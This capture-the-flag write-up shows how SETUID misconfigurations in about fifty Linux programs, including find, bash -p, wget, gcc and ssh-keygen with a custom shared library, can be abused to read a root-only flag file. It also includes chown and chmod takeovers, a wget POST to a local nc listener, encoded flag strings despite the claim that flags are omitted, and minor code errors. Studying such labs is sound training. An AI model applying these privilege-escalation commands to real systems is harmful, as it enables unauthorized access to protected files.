
**NOTE: I have intentionally not added the flags so that you can practice on your own and actually type the commands and see them perform the magic instead of copying them without understanding.**

## 1. `cat`

```bash
cat /flag
```

Reading the file permissions for `/usr/bin/cat` I found out it has **SETUID** setup for this binary at the root level so I used it to read the contents of the flag. The `->` sign means `cat` is a symbolic link and `/usr/bin/cat` is the actual path of the `cat` command.


## 2. `more`

```bash
more /flag
```


## 3. `less`

```bash
less /flag
```

The `less` command is a file pager that allows viewing the content of files one screenful at a time, providing interactive navigation.


## 4. `tail`

```bash
tail /flag
```


## 5. `head`

```bash
head /flag
```


## 6. `sort`

```bash
sort /flag
```


## 7. `vim`

`vim` is an editor so when the command gets executed a window opens up and you can get your flag from there.

```bash
vim /flag
```


## 8. `emacs`

`emacs` is a GUI text editor. To bypass the GTK we need to use the `-nw` switch. A window will open up showing the contents of the flag file.

```bash
emacs -nw /flag
```


## 9. `nano`

`nano` is another text editor. Again a new window will open will displaying the flag contents.

```bash
nano /flag
```


## 10. `rev`

`rev` command is used to reverse the order of the characters present in the file. We use the `rev` command first to get the reverse characters' string then again use `rev` to get the original structure.

```bash
rev /flag
echo '}WzU5OTczLDE1Ml0.-A46lL90ghJW0u-EQ2g6RUNlDKo{egelloc.nwp' | rev
```


## 11. `od`

`od` command displays data in octal format (0-7). Read the output as individual characters if you are confused. `-c` switch to get character of each octet value.

```bash
od -c /flag
```


## 12. `hd`

`hd` command displays data in hexadecimal, octal and ascii format

```bash
hd /flag
```


## 13. `xxd`

`xxd` command used for hex encoding/decoding and produces the hex dump of the file contents.

```bash
xxd /flag
```


## 14. `base32`

It is an encoding format. The `-d` switch is used to decode the `base32` encoding format. The above command gives us the `base32` encoded data of the flag content. Passing the `base32` data into a temporary file. Decoding the encoded data to get the flag value.

```bash
base32 /flag
echo 'OB3W4LTDN5WGYZLHMV5WO6BVLA3TEU2PJJ5EMRSCMFYS2VDLKE2EGRZWNN2WMRJOGBWE4MKFIRGHUY2UJ42VK6SXPUFA====' > /tmp/baseForm
base32 -d /tmp/baseForm
```


## 15. `base64`

The binary data is split into 6 bit chunks from the left to right. 64 characters are there so the encoding is done as per the base64 mapping. The `=` sign is for the extra bits. Passing the `base64` data into a temporary file. Decoding the encoded data to get the flag value.

```bash
base64 /flag
echo 'cHduLmNvbGxlZ2V7RXJNUzFTMUFiUFFaTjNIaWRHQjdhdTNjV3FNLjAxTjFFREx6Y1RPNVV6V30K' > /tmp/flag
base64 -d /tmp/flag
```


## 16. `split`

`split` command is used to split the content of the file based upon our choice of lines. I only split in 1 line because the flag content will be of 1 line only.

```bash
split -l 1 /flag
cat xaa
```


## 17. `gzip`

`gzip` is used for compression of files. We need to decompress the files to get our flag so we will use the `-d` switch for decompression.

```bash
gzip -c /flag > /tmp/flag.gz 
gzip -d /tmp/flag.gz 
cat /tmp/flag 
```


## 18. `bzip2`

Same procedure for the `bzip2` just like `gzip`.

```bash
bzip2 -c /flag > /tmp/flag.bz2
bzip2 -d /tmp/flag.bz2 
cat /tmp/flag 
```


## 19. `zip`

`zip` is just another compression program for files and programs, same as `gzip` and `bzip2`. In `zip` command the **arg1** is the `.zip` file you need to create to store the compressed data and then use `unzip` command to decompress the compressed data to get it back in its original state.

```bash
zip /tmp/flag.zip /flag
cd /tmp/
unzip flag.zip                    
cat flag
```


## 20. `tar`

`tar` is another program used for archiving files. `tar -cf` is used to compress the file so we need to make our archive file in `.tar` extension and the `-xf` is for decompressing the file. The `-xOf` combined takes decompresses the file and puts in STDOUT and the shell redirects it into a different location where we will not face any permission issues.

```bash
tar -cvf flag.tar flag
tar -xOf flag.tar > /tmp/flag_copy
cat /tmp/flag_copy
```


## 21. `ar`

To archive a file we need to use `-r` switch and store that data into a file with `.a` extension.  To extract the file we use `-x` switch.

```bash
ar r flag.a /flag
ar x flag.a
cat flag
```


## 22. `cpio`

`-ov` is to archive the file and verbose output. `-i` is to extract the file and `--to-stdout` is to send the extracted data to standard output. We need to mention the file inside the `.cpio` file we are extracting (here **flag**) so that we can redirect the extracted contents of it to another file (here **flag_contents**).

```bash
echo flag | cpio -ov > /tmp/flag_copy.cpio
cd /tmp
cpio -i --to-stdout flag < flag_copy.cpio > flag_contents
cat flag_contents
```


## 23. `genisoimage`

`-sort` switch tries to determine the file's **priority** and **path**. The **path** helps `genisoimage` to find the exact location of the file and the **priority** tells where the file should be placed inside the ISO image file. In trying to do this it reads the contents of the file and gives us the flag.

```bash
genisoimage -sort /flag
```


## 24. `env`

 **Environment Variables** are essential and can be accessed based on their scope (**local** and **global**). These variables are essential to run a program or find its path .etc. `env` command in Linux helps to manage the **environment variables**, **run a command**, **add new variables** .etc. Since in this challenge `/usr/bin/env` is set as SETUID binary we will use it read the flag file contents as shown below.

```bash
env cat /flag
```


## 25. `find`

`find` command in Linux helps us to find files or directories in Linux. Now normally `find` command is not used to read a file but the `-exec` switch can be used to execute another command if the file we are looking for is found. The `\;` sign is required to terminate the `-exec` command.

```bash
find / -type f -name 'flag' -exec cat /flag \;
```


## 26. `make`

`make` command in Linux is used for automating the task of building a binary from the source code. A special **makeFile** is created specially for the `make` command which tells it how the source code is linked and how to form the binary.

### makefile

Below is the **makefile** containing the script which the `make` command will run. **readFlag** is the target which is basically the thing the `make` command needs to achieve. The filename should be **makefile** to avoid any unnecessary conflicts.

```makefile
readFlag:
	@cat /flag
```

To read the contents of the **makefile** using the `make` command use the `-f` switch as shown below and get your flag.

```bash
make -f makefile
```


## 27. `nice`

`nice` command is used to set priorities to the process and also run a process. Since we have SETUID binary set to the command we can use to read contents of the flag.

```bash
nice cat /flag
```


## 28. `timeout`

`timeout` command runs a specified command for a given period of time and after that time it terminates whatever command it was running before given it has not yet finished executing. The `s` is for seconds.

```bash
timeout 1s cat /flag
```


## 29. `stdbuf`

`stdbuf` command is used to handle the buffering behavior of the standard input(stdin). When input supplied from stdin (keyboard or mouse), this data is temporarily stored somewhere which is basically the buffer memory.

`-i` => Input Mode
`0` =>Unbuffered Mode (**Data read directly from the source**)
`1` => Buffered Mode (**Data read indirectly since it gets stored into a temporary memory i.e. buffer memory**)

The command basically tries to read data unbuffered from stdin by using the `cat` command.

```bash
stdbuf -i0 cat /flag
```


## 30. `setarch`

The `setarch` command is used by developers to test and run their applications by emulating a certain architecture. Specifying the architecture is necessary so using `$(uname -m)` fetches the current architecture name of the OS and since `setarch` has SETUID binary set we can use it to read the contents of the flag.

```bash
setarch $(uname -m) -- cat /flag
```


## 31. `watch`

`watch` command used to execute a command at certain intervals of time repeatedly in output fullscreen. The `-x` switch can be used to pass a command we want to run.

```
watch -x cat /flag
```


## 32. `socat`

`socat` command is used for bidirectional data transfers between 2 independent data channels.

```bash
socat EXEC:'cat /flag' STDIO
```


## 33. `whiptail`

`whiptail` command is used to allow shell scripts to display boxes to the user for informational purposes. We are going to used the `--textbox` switch to display the contents of the flag file. **SYNTAX** => `whiptail --textbox <file> <height> <width>` . When the command is run the contents are displayed in a box. The height and width is of the same box.

```bash
whiptail --textbox /flag 30 30
```


## 34. `awk`

`awk` is a powerful text processing and pattern scanning tool in Linux. To a read a file and all its contents we use the `'{print}'` switch.

```bash
awk '{print}' /flag
```


## 35. `sed`

`sed` command is a basic non interactive text editor and we can use this command to perform various operations as well. To read all the contents of the file without making any modifications we use `''` notation.

```bash
sed '' /flag
```


## 36. `ed`

`ed` is a simple text editor which was way before advanced or modern text editors like `vim` came to Linux. The `,p` command is used to print all the lines of the file. `q` command is used to exit the text editor.

```bash
ed /flag
```


## 37. `chown`

`chown` command is to change owner of the file permissions. Changed the flag file permissions to the non root user so that we can read the flag file contents.

```bash
chown hacker /flag
```


## 38. `chmod`

`chmod` command can be used to change the **read - r**, **write - w**, **execute -x** permissions of the file for **owner**, **groups** and **others**. `444` basically means setting read permissions for owner, group and others for the flag file. `4 = read(r)` permission.

```bash
chmod 444 /flag
```


## 39. `cp`

`cp` command is used to copy a file and store into our desired target location. Its important that you create a file which will act as the target location where you will drop the contents of the flag file. This makes sure that the dummy flag file has sufficient permissions for us.

```bash
touch /tmp/flagCopy
cp /flag /tmp/flagCopy
cat /tmp/flagCopy
```


## 40. `mv`

`mv` command is basically cut operation. We use this command to cut a file or folder and change the original location of the file. We can also use it to rename a file.

This is a tricky challenge. So, here's a **PRO TIP: Remember that your home directory is consistent i.e. stores files or directories even after restarting the instance.** Restart this challenge in **Priviledge Mode** and read the flag file. 

```bash
mv /flag ~/flagCopy
```


## 41. `perl`

Below is the `perl` program to read a file. Remember to keep the extension in `.pl`.
#### script.pl

```perl
#!/usr/bin/perl
open(r, "<", "/flag");
print(<r>);
close(r);
```

Give executable permissions to the `perl` script using `chmod +x script.pl` and then run the script using `perl script.pl`.


## 42. `python`

Reading a file using a `python` program. Remember the extension for `python` programs are `.py`.
#### script.py

```python
file=open("/flag", "r")
content=file.read()
print(content)
file.close()
```

Run the above program using `python script.py` to get the flag content.


## 43. `ruby`

Reading a file using a `ruby` program. Remember the extension for `ruby` programs are `.rb`.
#### script.py

```ruby
File.open("/flag", "r") do |file|
	content=file.read
	puts content
end
```

Run the above `ruby` program using `ruby script.rb`


## 44. `bash`

`bash` script if set to SETUID will drop its privileges if we create a script and execute it. The 2 switches come in handy.
- `-p` -> Prevents dropping of privileges.
- `-c` -> Executes commands given as string.

```bash
bash -p -c "cat /flag"
```


## 45. `date`

`date` command is used to display date and time in the current system. We can also use it to manipulate the system's date and time.  We are going to use the `-f` switch to solve this challenge. The `-f` switch tries to interpret each line of text and display its corresponding date based on the line but since its a flag file the data format will be invalid and it will just display the flag contents.

```bash
date -f /flag
```


## 46. `dmesg`

`dmesg` command is used to display messages from the **kernel ring buffer**. This buffer stores all the kernel logs and the `dmesg` reads these logs. This buffer generates messages during boot but instead of reading from the **kernel ring buffer** we use the `-F` switch to read from a file instead of **kernel ring buffer**.

```bash
dmesg -F /flag
```


## 47. `wc`

`wc` command is used to count the number of lines, words and bytes from the file. We can use the `--files0-from` switch to read the contents of the flag file.

```bash
wc --files0-from=/flag
```


## 48. `gcc`

`gcc` command is used to compiler C programs and produce C executables. We are going to use the `@file` argument. Read command-line options from _file_.  The options read are inserted in place of the original @_file_ option.  If _file_ does not exist, or cannot be read, then the option will be treated literally, and not removed. [gcc manual](https://man7.org/linux/man-pages/man1/gcc.1.html).

```bash
gcc @/flag
```


## 49. `as`

`as` command is the portable GNU assembler in Linux. Using as command, we can read and assemble a source file. We will use the `@FILE` to read a file.

```bash
as @/flag
```


## 50. `wget`

`wget` command is used to download files using HTTP, HTTPS and FTP protocols. For this I setup a listener using `nc` command or port `80` and send POST request to the localhost. Open 2 terminal tabs for this. They are :-

- Listener (`nc`)
- Client (`wget`)

You will get the response in Listener tab since its going to accept the request from the client. **Remember to start the listener first before sending the request or else the request won't be received.**
#### Listener

```bash
nc -l -v -p 8000
```
##### Client

```bash
wget --method=POST --body-file=/flag http://127.0.0.1:8000/
```

So to summarize, `wget` reads the flag file contents because `wget` is in SETUID and then sends that data as POST request to the localhost on port `8000` and the listener i.e. `nc` receives the request and displays us the POST request content send by the client i.e. `wget`.


## 51. `ssh-keygen`

`ssh-keygen` command is used to produce private and public keys which are used to login into an SSH session. Here we need to load our own plugin code so that we can read the flag file.

#### readFlag.c

```c
#include <stdio.h>

void C_GetFunctionList()
 {
    FILE *filePointer;
    char content[256];

    filePointer = fopen("/flag", "r");
    if (!filePointer) {
        perror("fopen");
        return 1;
    }

    while (fgets(content, sizeof(content), filePointer)) {
        printf("%s", content);
    }

    fclose(filePointer);
}
```

`ssh-keygen` has the ability to load shared libraries so we need to compile our above c code as shared library using `gcc` command.

##### Forming Shared Library

```bash
gcc -shared -fPIC readFlag.c -o readFlag.so
```

Shared libraries in Linux have `.so` extension while Windows have `.dll`.  Shared Libraries are dynamically linked i.e. the OS loads these libraries during runtime and contain a piece of code which some other application might need. Instead of copying this code and pasting into different files each time the OS dynamically loads them during runtime.

### PKCS#11

API for Cryptographic Tokens : PKCS#11 defines a C programming interface that allows applications like `ssh-keygen` and `ssh-agent` to communicate with and utilize cryptographic tokens. **PKCS11** has a function called `void C-GetFunctionList()` which is executed first so I added it instead of `int main()`.

### Running `ssh-keygen`

`-D` switch is used to load a shared library. Before doing this its better to move your `.so` or shared library to `/tmp` folder.

```bash
ssh-keygen -D /tmp/readFlag.so
```

